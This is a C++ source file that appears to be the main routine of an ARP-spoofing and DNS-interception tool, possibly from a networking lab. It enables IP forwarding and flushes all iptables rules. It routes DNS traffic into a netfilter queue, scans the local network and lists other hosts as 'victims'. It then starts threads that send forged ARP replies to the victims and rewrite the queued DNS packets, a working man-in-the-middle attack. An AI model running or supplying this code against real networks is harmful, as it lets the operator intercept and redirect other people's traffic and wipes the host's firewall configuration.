#include "utils.hpp"

using namespace std;

int main () {
  char tmp[20];
  system("echo `ip route | head -n 1 | awk '{print $5}'` > ./ifname");
  FILE *pp = fopen("./ifname", "r");
  fscanf(pp, "%s", tmp);
  fclose(pp);
  system("rm ./ifname");
  string ifname(tmp);
  // cout << ifname << '\n';

  cout << "Available devices:\n";
  cout << "---------------------------------------\n";
  cout << "IP\t\tMAC\n";
  cout << "---------------------------------------\n";

  map<string, string> arp_table;

  // get gateway ip
  system("sysctl net.ipv4.ip_forward=1 > /dev/null");
  // system("sysctl net.ipv4.conf.all.send_redirects=0 > /dev/null");
  // system("sysctl net.ipv4.conf.all.secure_redirects=0 > /dev/null");
  system("iptables -F");
  system("iptables -F -t nat");
  char cmd[100];
  sprintf(cmd, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", ifname.c_str());
  system(cmd);
  system("iptables -A FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 0");
  system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
  system("echo `ip route | head -n 1 | awk '{print $3}'` > ./gate_ip");

  // read gate_ip to get gateway ip in char*
  char *gwip = new char[16];
  FILE *fp = fopen("./gate_ip", "r");
  fscanf(fp, "%s", gwip);
  fclose(fp);
  system("rm ./gate_ip");

  uint32_t dst_ip = inet_addr(gwip);
  test_arp(ifname.c_str(), dst_ip, arp_table);
  vector<string> victims;
  // ip -> mac (map)
  for(map<string, string>::iterator it = arp_table.begin(); it != arp_table.end(); it++) {
    if(it->first != gwip) {
      cout << it->first << '\t' << it->second << '\n';
      victims.push_back(it->first);
    }
  }
  cout << '\n';

  struct need_info nd_info;
  nd_info.ifname = ifname.c_str();
  nd_info.arp_table = arp_table;
  unsigned char *gw_mac = new unsigned char[6];
  str2mac(arp_table[gwip].c_str(), gw_mac);
  thread t1 = thread(thread_reply, ifname.c_str(), victims, arp_table, gw_mac, inet_addr(gwip));
  thread t2 = thread(nfq_thread, 1, nd_info);
  t1.join();
  t2.join();
  

  return (EXIT_SUCCESS);
}
